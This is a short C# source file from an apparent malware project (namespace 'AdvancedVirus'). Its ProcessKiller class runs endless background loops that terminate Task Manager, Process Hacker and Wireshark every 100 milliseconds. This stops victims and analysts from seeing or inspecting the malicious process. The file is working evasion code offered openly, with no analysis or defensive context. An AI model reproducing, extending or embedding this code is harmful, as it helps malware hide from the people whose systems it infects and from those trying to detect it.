using System;
using System.Diagnostics;
using System.Threading.Tasks;

namespace AdvancedVirus
{
    public class ProcessKiller
    {
        public void StartTaskManagerKiller()
        {
            StartProcessKiller("taskmgr");
        }

        public void StartProcessHackerKiller()
        {
            StartProcessKiller("ProcessHacker");
        }

        public void StartWiresharkKiller()
        {
            StartProcessKiller("Wireshark");
        }

        private void StartProcessKiller(string processName)
        {
            Task.Run(() =>
            {
                while (true)
                {
                    var processes = Process.GetProcessesByName(processName);
                    foreach (var process in processes)
                    {
                        try
                        {
                            process.Kill();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"Error killing {processName}: {ex.Message}");
                        }
                    }
                    Task.Delay(100).Wait();
                }
            });
        }
    }
}